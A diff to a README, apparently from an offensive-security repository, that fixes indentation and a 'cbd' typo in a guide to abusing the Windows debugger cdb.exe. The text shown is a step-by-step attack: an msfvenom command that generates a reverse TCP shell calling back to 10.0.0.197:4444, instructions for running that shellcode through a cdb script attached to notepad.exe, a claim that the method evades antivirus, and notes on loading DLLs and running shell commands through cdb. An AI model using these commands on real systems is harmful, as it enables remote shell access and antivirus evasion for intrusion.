@@ -40,15 +40,15 @@ It's that easy! It's also great at evading AV scanning due to the unusual format
 
 1. Generate shellcode using msfvenom
 
-    msfvenom -p window/x64/shell_reverse_tcp LHOST=10.0.0.197 LPORT=4444 -f python
+        msfvenom -p window/x64/shell_reverse_tcp LHOST=10.0.0.197 LPORT=4444 -f python
 
 2. Download the aforementioned script and replace the shellcode with yours then run the script
 
-    python3 script.py > test.wds
+        python3 script.py > test.wds
 
 3. Send it over to the target machine and use the following command
 
-    cdb.exe -pd -cf c:\path\to\payload\test.wds -o notepad.exe
+        cdb.exe -pd -cf c:\path\to\payload\test.wds -o notepad.exe
 
 ![Shellcode-Run](./shellcode_run.gif)
 
@@ -80,7 +80,7 @@ You can also hit CTRL+C then 'q' in the cdb console and it'll exit cdb without i
 
 # Running a DLL
 
-You can use cbd to load a DLL. The DLL is loaded inside cbd not the attached process. The downside of this technique is it won't work if you don't have the rest of the debugger tools because it requires additional DLLs that are located inside the directory.
+You can use cdb to load a DLL. The DLL is loaded inside cdb not the attached process. The downside of this technique is it won't work if you don't have the rest of the debugger tools because it requires additional DLLs that are located inside the directory.
 
 To execute a DLL, first attach cdb to any process.
 
@@ -98,7 +98,7 @@ If we look at the DLLs loaded by cdb we see our inject DLL, d32lib.dll.
 
 # Executing Shell Commands
 
-Again, attach cbd to any process.
+Again, attach cdb to any process.
 
     cdb.exe -pd -pn notepad.exe
 
